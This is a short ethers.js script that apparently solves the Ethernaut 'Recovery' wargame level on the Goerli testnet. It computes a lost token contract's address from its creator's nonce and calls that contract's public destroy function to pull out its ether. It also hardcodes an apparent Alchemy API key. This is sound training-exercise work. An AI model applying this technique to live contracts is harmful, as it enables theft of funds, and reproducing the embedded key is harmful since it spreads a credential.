const { ethers } = require("ethers");
const fs = require("fs-extra");
require("dotenv").config();

async function main() {
  const provider = new ethers.providers.JsonRpcProvider(
    "https://eth-goerli.g.alchemy.com/v2/NW7PWVbJEDvetNwwfXGraE71PLMqeBrw"
  );

  let signer = new ethers.Wallet(process.env.PRIVATE_KEY, provider);
  const abi = fs.readFileSync(
    "./Ethernauts_abi_bin/contracts_Recovery_Recovery_sol_Recovery.abi",
    "utf8"
  );
  const abiSimpleToken = fs.readFileSync(
    "./Ethernauts_abi_bin/contracts_Recovery_Recovery_sol_SimpleToken.abi",
    "utf8"
  );

  const recovery = new ethers.Contract(
    "0x7e51cEFd9e54d3DB503Ef4b4F8B00FBA45976Df2",
    abi,
    signer
  );
  console.log("...");
  // start to interact with a contract
  const noncelater = await provider.getTransactionCount(
    "0x7e51cEFd9e54d3DB503Ef4b4F8B00FBA45976Df2"
  );
  const nonce = 1;
  console.log(nonce);
  const anticipatedAddress = ethers.utils.getContractAddress({
    from: "0x7e51cEFd9e54d3DB503Ef4b4F8B00FBA45976Df2",
    nonce,
  });
  console.log(anticipatedAddress);
  // try to call destroy and receive ether
  const simpleToken = new ethers.Contract(
    anticipatedAddress,
    abiSimpleToken,
    signer
  );
  const destroying = await simpleToken.destroy(
    "0xEE4C6578F5AB9B07b9599Ac51c84a83BB264AAfe"
  );
  destroying.wait(1);
  console.log("Destroyed");
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
